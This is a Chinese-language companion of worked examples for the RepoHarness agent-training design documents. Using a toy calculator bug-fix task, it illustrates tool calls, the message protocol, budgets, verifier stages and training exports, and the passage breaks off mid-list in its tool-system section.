# 00-12 设计文档具体例子对照

这份文档是给你阅读 `docs/00-reading-guide.md` 到 `docs/12-resume-narrative-and-demo-artifacts.md` 时配套看的“例子册”。主设计文档负责定义边界、对象和不变量；这份文档只负责把那些抽象概念放进一个具体任务里，让你能一边读设计文档，一边在脑子里看到 RepoHarness 到底会怎样运行。

注意：下面所有例子都是说明性例子，不表示当前仓库已经实现了这些运行结果。它们的用途是帮助理解设计，不是当前功能交付声明。

关于代码块注释：本文里的 `jsonc` 代码块是带注释的阅读版，标准 JSON 文件本身不支持 `//` 注释；真实落盘的 `transcript.jsonl`、`events.jsonl`、`verifier.json`、`reward.json` 和导出 JSONL 必须去掉注释，保持合法 JSON。YAML 示例中的 `#` 注释可以作为阅读说明。

字段来源说明：示例中的对象名称、核心字段和状态枚举尽量来自 `docs/00` 到 `docs/12` 的设计文档，尤其是 `06`、`07`、`08`、`10`、`11` 中定义的 schema 和对象流。具体的 `run_id`、`artifact_id`、路径、hash、时间戳、错误文本、示例 reward 数值等是为了讲解而构造的示例值，不表示当前仓库已经生成这些产物，也不表示未来实现必须逐字使用这些取值。

---

## 贯穿示例：buggy_calculator 任务

后面每一章都会尽量沿用同一个任务，避免每个概念都换背景。

假设有一个非常小的 Python 仓库：

```text
fixtures/repos/buggy_calculator/
  pyproject.toml
  calculator.py
  tests/
    test_calculator.py
```

`calculator.py` 当前内容：

```python
def add(a, b):
    return a + b


def multiply(a, b):
    return a * b


def divide(a, b):
    return a / b
```

测试文件里已有旧测试和一个新暴露的失败测试：

```python
import pytest

from calculator import add, divide, multiply


def test_add():
    assert add(2, 3) == 5


def test_multiply():
    assert multiply(4, 5) == 20


def test_divide_by_zero():
    with pytest.raises(ValueError, match="division by zero"):
        divide(10, 0)
```

任务目标是：

```text
Fix division by zero handling in calculator.divide without regressing existing arithmetic tests.
```

也就是说，模型需要把 `divide(10, 0)` 从 Python 默认的 `ZeroDivisionError` 改成项目希望的 `ValueError("division by zero")`，同时不能破坏 `add` 和 `multiply`。

一个合理最终补丁可能是：

```diff
diff --git a/calculator.py b/calculator.py
--- a/calculator.py
+++ b/calculator.py
@@
 def divide(a, b):
+    if b == 0:
+        raise ValueError("division by zero")
     return a / b
```

下面所有例子都围绕这条任务闭环展开：

```text
task.yaml
  -> source checkout
  -> setup workspace
  -> baseline verifier
  -> agent run workspace
  -> agent loop
  -> final.patch
  -> strict final verifier
  -> verifier.json
  -> reward.json
  -> export records
```

---

## 00-reading-guide.md：把项目一句话落到具体运行

### 例子 00-1：核心闭环不是一句口号，而是一组可落盘事实

`00-reading-guide.md` 里的一句话闭环是：

```text
task -> executable workspace -> tools -> agent loop -> trajectory -> verifier -> reward/eval/export
```

放到 `buggy_calculator` 里，它具体对应：

| 抽象环节 | 在例子里的具体物体 |
| --- | --- |
| `task` | `repo_task_001.yaml`，里面写任务描述、仓库路径、测试命令、环境身份和字段可见性。 |
| `executable workspace` | 从 `fixtures/repos/buggy_calculator` 复制出来的 setup workspace、agent run workspace 和 verification workspace。 |
| `tools` | 模型可以调用 `read_file("calculator.py")`、`edit_file(...)`、`run_tests()`、`git_diff()` 等工具。 |
| `agent loop` | 模型先读文件，再编辑文件，再运行测试，再根据测试结果决定是否结束。 |
| `trajectory` | `transcript.jsonl` 记录模型消息和工具观察；`events.jsonl` 记录工具、权限、测试、上下文和终止事件。 |
| `verifier` | `pytest -q` 被解析成结构化 `VerifierResult`，例如 fail-to-pass 是否通过、pass-to-pass 是否回归。 |
| `reward/eval/export` | `reward.json` 记录 reward metadata；`metrics.json` 记录评测指标；导出器生成 SFT 或强化学习 rollout JSONL。 |

这能帮助你理解：RepoHarness 的重点不是“模型最后答对了没有”，而是“整个解决过程是否在可执行环境里发生、是否被完整记录、是否能被同一套 verifier 评测和导出”。

### 例子 00-2：核心术语的最小对照

一次成功轨迹里可能出现这些对象：

```jsonc
{"role": "assistant", "tool_calls": [{"id": "call_001", "name": "read_file", "arguments": {"path": "calculator.py"}}]}  // role: 消息角色，例如 system、user、assistant、tool、verifier 或 termination；tool_calls: 模型请求执行的一组工具调用；id: 示例中的唯一标识，具体含义取决于所在对象；name: 名称字段，例如工具名或导出对象名；arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例
{"role": "tool", "tool_call_id": "call_001", "content": "def add(a, b): ... def divide(a, b): return a / b"}  // role: 消息角色，例如 system、user、assistant、tool、verifier 或 termination；tool_call_id: 单次工具调用的唯一标识，必须和 tool result 配对；content: 消息或工具观察的文本内容示例
{"role": "assistant", "tool_calls": [{"id": "call_002", "name": "edit_file", "arguments": {"path": "calculator.py", "old_text": "def divide(a, b):\n    return a / b", "new_text": "def divide(a, b):\n    if b == 0:\n        raise ValueError(\"division by zero\")\n    return a / b"}}]}  // role: 消息角色，例如 system、user、assistant、tool、verifier 或 termination；tool_calls: 模型请求执行的一组工具调用；id: 示例中的唯一标识，具体含义取决于所在对象；name: 名称字段，例如工具名或导出对象名；arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例；old_text: 模型期望在文件中找到并替换的旧文本；new_text: 模型希望写入的新文本
{"role": "tool", "tool_call_id": "call_002", "content": "Edited calculator.py successfully."}  // role: 消息角色，例如 system、user、assistant、tool、verifier 或 termination；tool_call_id: 单次工具调用的唯一标识，必须和 tool result 配对；content: 消息或工具观察的文本内容示例
```

这里：

- `tool call` 是模型请求 Harness 做动作。
- `tool result` 是 Harness 做完动作后返回给模型的观察。
- `trajectory` 是这些 action-observation 的完整序列。
- `verifier` 不是普通工具日志，而是把测试结果变成结构化评测信号的组件。
- `reward metadata` 不是新的强化学习算法，而是从 final verifier、成本、补丁大小、失败类型等事实中计算出来的训练候选字段。

### 例子 00-3：为什么这不是 Claude Code 复刻

如果你用 Claude Code 做这个任务，用户会关注交互体验：能不能展示 diff、能不能确认编辑、能不能在终端里继续聊天。

RepoHarness 关注的是另一组问题：

- 这次运行的每个 tool result 是否能重放。
- 中间测试反馈和最终 verifier 是否使用同一套 parser。
- 失败轨迹能否保留为训练或诊断数据。
- SFT 导出时哪些 assistant message 参与 loss，哪些 tool observation 只作为环境反馈。
- 强化学习 rollout 导出时 reward 是否能追溯到 final verifier，而不是人工感觉。

所以它借鉴 Claude Code 的 agent loop、工具契约、权限边界和轨迹思想，但不需要复刻用户界面、插件市场或交互式审批体验。

---

## 01-project-positioning-and-requirements.md：项目定位和第一版范围

### 例子 01-1：RepoHarness 补齐的是“真实仓库长轨迹”这一块

用三个项目类型对比会更直观：

| 项目类型 | 典型任务 | 工具反馈 | 最终验证 | 训练数据 |
| --- | --- | --- | --- | --- |
| 搜索智能体项目 | “查找某个网页答案” | 搜索、打开网页、查找文本 | 答案是否匹配 | 浏览轨迹、搜索历史、答案 reward |
| 算法题训练项目 | “写一个函数通过隐藏测试” | 代码执行、单文件测试 | 单个函数测试通过 | 代码、测试反馈、verifier reward |
| RepoHarness | “修改一个仓库里的 bug” | 读文件、搜索、编辑、多轮测试、diff | strict patch replay final verifier | action-observation 轨迹、final patch、verifier、reward metadata |

`buggy_calculator` 看起来很小，但它已经具备 repository-level task 的核心要素：任务定义、工作区、文件编辑、测试反馈、最终 patch、pass-to-pass regression 检查和训练导出。

### 例子 01-2：第一版最小可运行闭环长什么样

第一版不需要一开始接真实模型。可以让 fake model 按固定脚本输出工具调用：

```text
Turn 1: read_file calculator.py
Turn 2: edit_file calculator.py
Turn 3: run_tests
Turn 4: git_diff
Turn 5: final answer
```

只要 Harness 能稳定做到下面这些事，第一版闭环就成立：

```text
1. 加载 repo_task_001.yaml。
2. 创建 setup workspace，运行 baseline verifier，确认任务有效。
3. 创建 agent run workspace，建立 agent_start_snapshot。
4. fake model 输出 read_file，Tool System 执行并回填 tool result。
5. fake model 输出 edit_file，Workspace Adapter 修改文件并记录 diff。
6. fake model 输出 run_tests，Verifier 解析 pytest 输出并回填摘要。
7. Agent Loop 停止后，先冻结 final.patch 和 final.diff。
8. 创建 verification workspace，应用 final.patch，运行 final verifier。
9. 生成 verifier.json、reward.json、metrics.json、summary.md。
10. 导出至少一条 SFT JSONL 和一条强化学习 rollout JSONL。
```

注意：这个闭环中的“模型”可以是 fake model，因为第一版要先验证协议、边界、记录和评测口径，而不是证明某个模型有多强。

### 例子 01-3：什么是非目标

对于 `buggy_calculator`，第一版可以做到：

```text
允许模型在受控 workspace 内读取 calculator.py。
允许模型用 edit_file 修改 calculator.py。
允许模型通过 run_tests 得到 pytest 失败摘要。
在最终 verifier 中重新应用 final.patch 并运行 pytest。
```

第一版不应该声称：

```text
这个 local process workspace 是生产级安全沙箱。
模型执行的所有命令都经过操作系统级网络隔离。
这个项目已经可以大规模异步 rollout。
这个项目已经完整复现 SWE-Bench。
这个项目发明了新的强化学习算法。
```

这个边界很重要，因为 RepoHarness 的真实卖点是训练和评测闭环的设计，而不是把所有工业级平台能力一次性做完。

### 例子 01-4：成功标准如何对应可观察产物

设计阶段的成功标准可以用文档完整性判断；实现阶段的成功标准必须用产物判断。

对于一次成功运行，你应该能打开：

```text
runs/20260430_120000_repo_task_001/
  task.yaml
  transcript.jsonl
  events.jsonl
  artifacts.json
  dependency_state.json
  final.patch
  final.diff
  verifier.json
  reward.json
  metrics.json
  summary.md
```

如果这些文件存在，而且它们的字段能互相引用，例如 `reward.json` 能指向 final verifier 结果，`metrics.json` 能从 events 聚合工具调用次数，`summary.md` 能解释失败原因，那么这个项目就已经不只是一个 agent demo，而是一个训练友好的 harness。

---

## 02-system-architecture.md：模块分层和对象流

### 例子 02-1：一次 run 由哪些模块接力完成

以 `repo-harness run-task tasks/repo_task_001.yaml --config configs/local.yaml` 为例，模块接力关系应该是：

```text
CLI / Eval Runner
  读取 RunConfig 和 task path
  调用 Task Adapter

Task Adapter
  读取 repo_task_001.yaml
  输出 RunnableTask 和 VerifierConfig

Workspace Adapter
  创建 source checkout 和 setup workspace
  执行 setup command
  捕获 dependency_state

Verifier
  在 setup workspace 中运行 baseline verifier
  输出 BaselineResult

Eval Runner
  根据 BaselineResult 判断任务有效
  生成 ResolvedVerifierPlan

Workspace Adapter
  创建 agent run workspace
  恢复 dependency_state
  建立 agent_start_snapshot

Context Builder
  构造 system message 和 user task message
  隔离 gold_patch、隐藏测试和 reward-only metadata

Agent Loop
  调模型、解析工具调用、回填工具结果、控制停止

Tool System
  校验工具输入、调用权限系统、格式化 ToolResult

Permission System
  判断这次 read_file、edit_file、run_tests 或 bash 是否允许

Trajectory Store
  记录 transcript、events 和 artifacts

Final Verifier / Reward / Exporter
  验证 final.patch，生成 reward、metrics 和训练导出
```

这条链路帮助你理解“每个模块拥有自己的边界”。例如 Tool System 不能直接偷偷打开文件写入，它必须通过 Workspace Adapter。Verifier 不能直接替代 Agent Loop，它只负责测试执行和结果解析。

### 例子 02-2：Context Builder 和 Context Manager 的区别

这两个名字容易混。

Context Builder 只在正式 agent run 开始时构造初始上下文，例如：

```text
System:
  You are a software engineering agent working inside a controlled repository workspace.
  Use only the provided tools.
  Do not access hidden evaluator metadata.

User:
  Task id: repo_task_001
  Issue: Fix division by zero handling in calculator.divide without regressing existing arithmetic tests.
  Repository root: /workspace
  Public test command summary: pytest -q
  Expected files visible to model: calculator.py
```

Context Builder 不能放进去的内容：

```text
gold_patch
hidden fail_to_pass list, if visibility says verifier_only
baseline raw pytest output
reward formula components
final verifier result
```

Context Manager 则在每轮模型调用前工作。比如第 6 轮时消息太长了，它把旧的 pytest 日志替换成：

```text
Older test output was replaced by an artifact reference.
Summary: tests/test_calculator.py::test_divide_by_zero failed with ZeroDivisionError.
Full output artifact: artifact_feedback_pytest_turn_003
```

所以：

- Context Builder 决定“任务一开始模型能知道什么”。
- Context Manager 决定“长轨迹过程中本轮模型实际看到哪些历史消息和摘要”。

### 例子 02-3：模块所有权错误的反例

错误写法：

```python
def edit_file_tool(path, old_text, new_text):
    # 反例：工具直接写文件，绕过 Workspace Adapter。
    text = open(path).read()
    open(path, "w").write(text.replace(old_text, new_text))
```

这个反例的问题：

- 没有 workspace boundary 检查。
- 没有符号链接检查。
- 没有权限事件。
- 没有 diff 捕获。
- 没有 artifact 记录。
- 没有陈旧读取保护。

符合设计的写法应该是：

```text
edit_file Tool
  normalize_input
  validate_input
  request PermissionDecision
  call workspace_facade.replace_text(...)
  receive WorkspaceEditResult
  map to ToolResult
  RunRecorder records transcript and events
```

这个例子能说明：模块边界不是为了“架构好看”，而是为了让训练轨迹、权限记录、失败诊断和最终 diff 都来自同一套事实。

### 例子 02-4：为什么 Training Exporter 不能重新运行 verifier

假设某次运行已经产生：

```text
verifier.json: accepted = true
reward.json: final_reward = 0.91
events.jsonl: tool_call_count = 14
final.patch: 已冻结
```

导出器应该只读取这些既有事实生成：

```text
exports/sft.jsonl
exports/rl_rollout.jsonl
```

它不应该重新跑 `pytest -q`。原因是导出器不是评测器。如果导出时重新评测，可能因为环境变化、依赖变化或测试随机性得到不同结果，导致训练样本和原始 run 不一致。

---

## 03-agent-loop-and-message-protocol.md：多轮循环和消息协议

### 例子 03-1：一条成功轨迹的最小消息序列

模型第一轮决定先读文件：

```jsonc
{
  "role": "assistant",  // 消息角色，例如 system、user、assistant、tool、verifier 或 termination
  "message_id": "msg_a_001",  // 消息在 transcript 中的唯一标识
  "tool_calls": [  // 模型请求执行的一组工具调用
    {
      "tool_call_id": "call_001",  // 单次工具调用的唯一标识，必须和 tool result 配对
      "tool_name": "read_file",  // 工具名称，例如 read_file、edit_file 或 run_tests
      "arguments": {"path": "calculator.py"}  // arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例
    }
  ]
}
```

Harness 执行后必须回填 tool result：

```jsonc
{
  "role": "tool",  // 消息角色，例如 system、user、assistant、tool、verifier 或 termination
  "message_id": "msg_t_001",  // 消息在 transcript 中的唯一标识
  "tool_call_id": "call_001",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "content_preview": "def add(a, b):\n    return a + b\n...\ndef divide(a, b):\n    return a / b",  // 模型可见的短预览，完整内容通常放入 artifact
  "artifact_refs": []  // 该对象引用的 artifact 列表
}
```

模型第二轮才能基于观察继续编辑：

```jsonc
{
  "role": "assistant",  // 消息角色，例如 system、user、assistant、tool、verifier 或 termination
  "message_id": "msg_a_002",  // 消息在 transcript 中的唯一标识
  "tool_calls": [  // 模型请求执行的一组工具调用
    {
      "tool_call_id": "call_002",  // 单次工具调用的唯一标识，必须和 tool result 配对
      "tool_name": "edit_file",  // 工具名称，例如 read_file、edit_file 或 run_tests
      "arguments": {  // 模型传给工具的原始参数
        "path": "calculator.py",  // 工作区内的相对路径示例
        "old_text": "def divide(a, b):\n    return a / b",  // 模型期望在文件中找到并替换的旧文本
        "new_text": "def divide(a, b):\n    if b == 0:\n        raise ValueError(\"division by zero\")\n    return a / b"  // 模型希望写入的新文本
      }
    }
  ]
}
```

这个配对关系就是 agent loop 的核心。如果 `call_001` 没有对应 tool result，下一轮模型上下文就是断的，训练导出也无法知道动作产生了什么环境反馈。

### 例子 03-2：异常也要补 ToolResult

假设模型调用了不存在的工具：

```jsonc
{
  "tool_call_id": "call_010",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "tool_name": "replace_code",  // 工具名称，例如 read_file、edit_file 或 run_tests
  "arguments": {"path": "calculator.py"}  // arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例
}
```

Harness 不应该静默跳过，也不应该直接崩溃。它应该生成合成 tool result：

```jsonc
{
  "role": "tool",  // 消息角色，例如 system、user、assistant、tool、verifier 或 termination
  "tool_call_id": "call_010",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "status": "error",  // 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  "error_type": "unknown_tool",  // 结构化错误类型，便于 metrics、reward 和诊断统一使用
  "content_preview": "Unknown tool: replace_code. Available tools: list_files, read_file, grep, edit_file, create_file, bash, run_tests, git_diff."  // 模型可见的短预览，完整内容通常放入 artifact
}
```

这样模型在预算允许时可以修正为 `edit_file`。同时 events 里会记录一次 `invalid_tool_call`，后续 metrics 可以统计无效工具调用率。

### 例子 03-3：run_tests 通过不等于最终成功

假设 agent 第 4 轮调用 `run_tests`，feedback verifier 显示：

```jsonc
{
  "verifier_stage": "feedback",  // verifier 阶段，例如 baseline、feedback 或 final
  "accepted": true,  // verifier 是否按 acceptance policy 接受当前 patch
  "fail_to_pass": {"passed": 1, "total": 1},  // fail_to_pass: 原本失败、目标要求修复的测试统计；passed: 通过数量；total: 总数量
  "pass_to_pass": {"passed": 2, "total": 2}  // pass_to_pass: 原本通过、要求保持通过的测试统计；passed: 通过数量；total: 总数量
}
```

Agent Loop 可以因此停止：

```jsonc
{"agent_stop_reason": "feedback_tests_passed"}  // Agent Loop 为什么停止
```

但是 Eval Runner 还必须做 formal final verifier。假设 final verifier 在 strict patch replay 中发现 `final.patch` 不能应用：

```jsonc
{
  "final_verifier_status": "failed",  // Agent Loop 停止后 final verifier 的状态
  "error_type": "patch_apply_failed"  // 结构化错误类型，便于 metrics、reward 和诊断统一使用
}
```

最终结论应是：

```jsonc
{
  "agent_stop_reason": "feedback_tests_passed",  // Agent Loop 为什么停止
  "final_verifier_status": "failed",  // Agent Loop 停止后 final verifier 的状态
  "run_outcome": "failed"  // 面向评测、导出和报告的最终运行结论
}
```

这就是为什么设计文档强调三层结论不能合并。`agent_stop_reason` 描述 agent 为什么停，`final_verifier_status` 描述最终验证结果，`run_outcome` 才是评测和训练过滤的最终口径。

### 例子 03-4：没有工具调用不一定是 final answer

模型可能返回：

```text
I will fix the bug now.
```

但没有 tool call，也没有实际修改文件。这不应该自动当作 `final_answer` 成功结束。实现必须检查：

- `finish_reason` 是否正常。
- assistant message 是否是有效最终答复。
- scaffold 是否允许无工具结束。
- 是否存在 provider error、max output tokens 或 streaming interrupted。
- 某些 scaffold 还可以额外检查当前 workspace 是否已有有效 diff，或者是否至少运行过一次 `run_tests`。这属于 scaffold 策略，不是通用 final answer 判定规则。

如果 simple ReAct scaffold 要求至少运行一次 `run_tests`，这个响应可能触发：

```jsonc
{
  "event_type": "non_final_no_tool_response",  // 事件类型，用来区分 permission、tool、verifier、context、termination 等事件
  "recovery_action": "retry_with_instruction",  // 协议错误后的恢复动作，例如重试、继续生成或停止
  "model_visible_error_created": true  // 是否生成了模型可见的错误 observation，让模型有机会修正
}
```

模型下一轮会看到：

```text
You did not call any tool and the task is not complete. Continue by inspecting or editing the repository.
```

### 例子 03-5：ToolCallParser 失败如何处理

假设供应商返回了半截工具 JSON：

```jsonc
{"name": "edit_file", "arguments": {"path": "calculator.py", "old_text":  // name: 名称字段，例如工具名或导出对象名；arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例；old_text: 模型期望在文件中找到并替换的旧文本
```

这不是正常 final answer。RepoHarness 应记录：

```jsonc
{
  "event_type": "tool_call_parse_failed",  // 事件类型，用来区分 permission、tool、verifier、context、termination 等事件
  "provider_request_id": "req_abc",  // 模型供应商返回的请求标识，便于排查具体 API 调用
  "parse_error_type": "partial_json",  // 工具调用解析失败类型，例如 partial_json 或 schema_mismatch
  "recoverable": true,  // 该错误是否允许在预算内重试或让模型修正
  "raw_provider_response_ref": {"artifact_id": "artifact_raw_response_003"}  // raw_provider_response_ref: 供应商原始响应 artifact 引用；artifact_id: artifact manifest 中的唯一标识
}
```

如果无法恢复合法 `tool_call_id`，可以在预算允许时给模型一条可见协议错误：

```text
Your previous response contained an incomplete tool call JSON. Please retry with a valid tool call.
```

如果多次失败，则停止为：

```jsonc
{"agent_stop_reason": "invalid_tool_call"}  // Agent Loop 为什么停止
```

### 例子 03-6：Provider Reasoning 和隐藏思考内容不能默认导出

假设某个模型供应商返回了三类内容：

```jsonc
{
  "assistant_text": "I will inspect calculator.py.",  // 供应商返回的普通 assistant 文本示例
  "tool_calls": [{"name": "read_file", "arguments": {"path": "calculator.py"}}],  // tool_calls: 模型请求执行的一组工具调用；name: 名称字段，例如工具名或导出对象名；arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例
  "reasoning_summary": "The model considered checking the divide function first.",  // 供应商可能返回的推理摘要，默认不作为训练目标
  "provider_internal_thinking_block": "<provider-specific hidden field>"  // 供应商内部 thinking 字段示例，默认不可训练
}
```

RepoHarness 可以把原始响应保存成 artifact：

```jsonc
{
  "raw_provider_response_ref": {  // 供应商原始响应 artifact 引用
    "artifact_id": "artifact_raw_provider_response_001",  // artifact manifest 中的唯一标识
    "relative_path": "artifacts/model/response_turn_001.json",  // artifact 相对 run directory 的路径
    "redaction_status": "pending_or_redacted"  // 脱敏状态，例如 not_needed、pending 或 redacted
  }
}
```

但默认进入 transcript 和训练导出的只应该是模型可见 assistant 文本和标准化 tool call：

```jsonc
{
  "role": "assistant",  // 消息角色，例如 system、user、assistant、tool、verifier 或 termination
  "content_preview": "I will inspect calculator.py.",  // 模型可见的短预览，完整内容通常放入 artifact
  "tool_calls": [{"name": "read_file", "arguments": {"path": "calculator.py"}}],  // tool_calls: 模型请求执行的一组工具调用；name: 名称字段，例如工具名或导出对象名；arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例
  "trainable": true  // 这条记录是否可以作为模型训练目标候选
}
```

隐藏 chain-of-thought、provider-specific thinking block 和未授权的 reasoning 内容默认应记录为 `model_visible = false`、`trainable = false`，只作为调试 artifact 或用量统计保存。即使供应商返回 reasoning summary，也要记录 `reasoning_summary_provider`、`export_allowed` 和 redaction 状态；默认不把它当作监督微调目标。

### 例子 03-7：BudgetManager 的具体检查点

一个 `RunConfig` 里可能配置：

```yaml
runtime:  # 运行时策略配置
  max_turns: 20  # Agent Loop 最大模型调用轮数
  max_tool_calls: 80  # 单次 run 最大工具调用次数
  max_test_runs: 6  # agent run 阶段最大 run_tests 次数
  task_timeout_sec: 900  # 单任务全局超时时间
workspace:  # 工作区和输出限制配置
  default_command_timeout_sec: 120  # 普通命令默认超时时间
context_management:  # 上下文治理策略配置
  max_context_tokens: 120000  # 单次模型调用最大上下文 token 预算
```

在 `buggy_calculator` 中：

- 第 21 次模型调用前，触发 `max_turns`，停止为 `agent_stop_reason = "max_turns"`。
- 第 7 次 `run_tests` 前，触发 `max_test_runs`，返回预算错误或停止为 `agent_stop_reason = "max_test_runs"`。
- 某次 `pytest -q` 超过 120 秒，工具结果是 `status = "timeout"`，但如果总预算还够，模型可以继续修复。
- 单任务运行超过 900 秒，Agent Loop 停止，未完成工具调用补齐 `interrupted` tool result。

预算不是最后统一检查，而是在模型调用前、工具执行前、测试路由前和 verifier 运行前分别检查。

---

## 04-tool-system-and-orchestration.md：工具契约和执行管线

### 例子 04-1：read_file 工具契约

`read_file` 不是一个随便的 Python 函数。它应该有稳定契约：

```text
Tool:
  name: read_file
  tool_version: read_file_v0
  model_visible_description: Read a text file inside the task workspace.
  input_schema:
    path: string
    start_line: optional integer
    end_line: optional integer
  is_read_only: true
  is_concurrency_safe: true
  is_destructive: false
  max_result_size: 12000
```

模型请求：

```jsonc
{
  "tool_call_id": "call_001",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "tool_name": "read_file",  // 工具名称，例如 read_file、edit_file 或 run_tests
  "arguments": {"path": "./calculator.py"}  // arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例
}
```

Tool System 规范化后：

```jsonc
{
  "requested_arguments": {"path": "./calculator.py"},  // requested_arguments: 模型原始请求参数，保留模型真实动作；path: 工作区内的相对路径示例
  "normalized_arguments": {  // Tool System 规范化后的参数，例如路径和默认值
    "path": "calculator.py",  // 工作区内的相对路径示例
    "start_line": 1,  // 读取文件的起始行号
    "end_line": null  // 读取文件的结束行号；null 表示读到默认范围或文件末尾
  },
  "normalized_input_hash": "sha256:..."  // 规范化输入的哈希，用于事件关联和复盘
}
```

Workspace Adapter 解析路径，确认它在 agent run workspace 内，然后读取文件。ToolResult 可以是：

```jsonc
{
  "tool_name": "read_file",  // 工具名称，例如 read_file、edit_file 或 run_tests
  "tool_call_id": "call_001",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "status": "ok",  // 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  "content_preview": "def add(a, b):\n    return a + b\n...",  // 模型可见的短预览，完整内容通常放入 artifact
  "path": "calculator.py",  // 工作区内的相对路径示例
  "start_line": 1,  // 读取文件的起始行号
  "end_line": 11,  // 读取文件的结束行号；null 表示读到默认范围或文件末尾
  "content_hash": "sha256:abc123",  // 读取到的文件内容哈希，用于后续编辑保护和复盘
  "truncated": false,  // 模型可见内容是否被截断
  "artifact_refs": []  // 该对象引用的 artifact 列表
}
```

这个 `content_hash` 后续可以被 `edit_file` 用作陈旧读取保护。

### 例子 04-2：edit_file 的陈旧读取保护

模型读到 `calculator.py` 后想编辑：

```jsonc
{
  "tool_call_id": "call_002",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "tool_name": "edit_file",  // 工具名称，例如 read_file、edit_file 或 run_tests
  "arguments": {  // 模型传给工具的原始参数
    "path": "calculator.py",  // 工作区内的相对路径示例
    "expected_content_hash": "sha256:abc123",  // 模型上次读取文件时看到的内容哈希，用于陈旧读取保护
    "old_text": "def divide(a, b):\n    return a / b",  // 模型期望在文件中找到并替换的旧文本
    "new_text": "def divide(a, b):\n    if b == 0:\n        raise ValueError(\"division by zero\")\n    return a / b",  // 模型希望写入的新文本
    "replace_all": false  // 是否替换所有匹配；false 通常要求 old_text 唯一匹配
  }
}
```

如果当前文件 hash 仍是 `sha256:abc123`，并且 `old_text` 唯一匹配，编辑成功：

```jsonc
{
  "status": "ok",  // 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  "content_preview": "Edited calculator.py. Replaced 1 occurrence.",  // 模型可见的短预览，完整内容通常放入 artifact
  "artifact_refs": [  // 该对象引用的 artifact 列表
    {"artifact_id": "artifact_diff_after_call_002", "kind": "diff"}  // artifact_id: artifact manifest 中的唯一标识；kind: artifact 类型，例如 verifier_stdout、diff 或 raw_provider_response
  ]
}
```

如果另一个工具或外部过程已经改了文件，hash 不匹配，应该返回：

```jsonc
{
  "status": "error",  // 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  "error_type": "stale_file_state",  // 结构化错误类型，便于 metrics、reward 和诊断统一使用
  "content_preview": "calculator.py changed since it was last read. Read the file again before editing."  // 模型可见的短预览，完整内容通常放入 artifact
}
```

这样可以避免模型基于旧观察覆盖新内容，训练轨迹里也能解释编辑为什么被拒绝。

### 例子 04-3：bash 被路由到 run_tests

模型可能请求：

```jsonc
{
  "tool_call_id": "call_006",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "tool_name": "bash",  // 工具名称，例如 read_file、edit_file 或 run_tests
  "arguments": {"command": "pytest -q", "timeout_sec": 120}  // arguments: 模型传给工具的原始参数；command: 实际执行的 verifier 或命令字符串；timeout_sec: 本次命令或工具调用请求的超时时间
}
```

任务定义中的 `test_command` 也是 `pytest -q`。Tool System 应把它路由到 `run_tests`：

```jsonc
{
  "requested_tool_name": "bash",  // 模型原始请求的工具名称
  "effective_tool_name": "run_tests",  // 系统路由后实际执行的工具名称
  "route_reason": "recognized_task_test_command",  // 工具路由原因，例如 bash 被识别为测试命令
  "route_policy_version": "repo_harness_route_policy_v0"  // 工具路由策略版本
}
```

返回的 ToolResult 不是普通 stdout/stderr observation，而是包含 verifier 摘要：

```jsonc
{
  "tool_name": "run_tests",  // 工具名称，例如 read_file、edit_file 或 run_tests
  "requested_tool_name": "bash",  // 模型原始请求的工具名称
  "effective_tool_name": "run_tests",  // 系统路由后实际执行的工具名称
  "status": "ok",  // 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  "verifier_result_preview": {  // 回填给模型看的 verifier 结果摘要，不是完整 verifier artifact
    "accepted": false,  // verifier 是否按 acceptance policy 接受当前 patch
    "fail_to_pass": {"passed": 0, "total": 1},  // fail_to_pass: 原本失败、目标要求修复的测试统计；passed: 通过数量；total: 总数量
    "pass_to_pass": {"passed": 2, "total": 2},  // pass_to_pass: 原本通过、要求保持通过的测试统计；passed: 通过数量；total: 总数量
    "error_type": "assertion_failure"  // 结构化错误类型，便于 metrics、reward 和诊断统一使用
  },
  "verifier_result_ref": {"artifact_id": "artifact_feedback_verifier_006"}  // verifier_result_ref: 完整 VerifierResult artifact 引用；artifact_id: artifact manifest 中的唯一标识
}
```

这样 transcript 保留模型真实动作是 `bash`，events 和 metrics 又知道实际消耗的是一次测试预算。

### 例子 04-4：grep 的 exit code 1 不是工具错误

模型搜索：

```jsonc
{"tool_name": "grep", "arguments": {"query": "safe_divide"}}  // tool_name: 工具名称，例如 read_file、edit_file 或 run_tests；arguments: 模型传给工具的原始参数；query: 搜索查询字符串
```

底层 `rg safe_divide` 可能退出码为 1，表示没有匹配。这不是工具崩溃。ToolResult 应该是：

```jsonc
{
  "status": "ok",  // 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  "match_count": 0,  // 搜索命中数量
  "content_preview": "No matches found for query: safe_divide",  // 模型可见的短预览，完整内容通常放入 artifact
  "exit_code": 1,  // 进程退出码；非零不一定表示 Harness 崩溃
  "exit_code_interpretation": "no_matches"  // 对 exit code 的解释，例如 grep 1 表示无匹配
}
```

如果把 exit code 1 统一当作 tool error，模型会误以为搜索工具坏了，而不是仓库里没有这个符号。

### 例子 04-5：并发工具结果必须按原始顺序提交

模型同一轮请求三个只读工具：

```text
call_010: read_file calculator.py
call_011: read_file tests/test_calculator.py
call_012: grep "divide"
```

这三个工具可以并发执行。但即使 `grep` 最先返回，回填顺序仍应该是：

```text
tool_result call_010
tool_result call_011
tool_result call_012
```

原因是 transcript、events、artifact id 和训练导出需要确定性。并发只能减少等待时间，不能改变轨迹顺序。

### 例子 04-6：为什么第一版 ReAct 不同时暴露 edit_file 和通用 apply_patch

第一版 simple ReAct scaffold 的模型可见工具集应该冻结为：

```text
list_files
read_file
grep
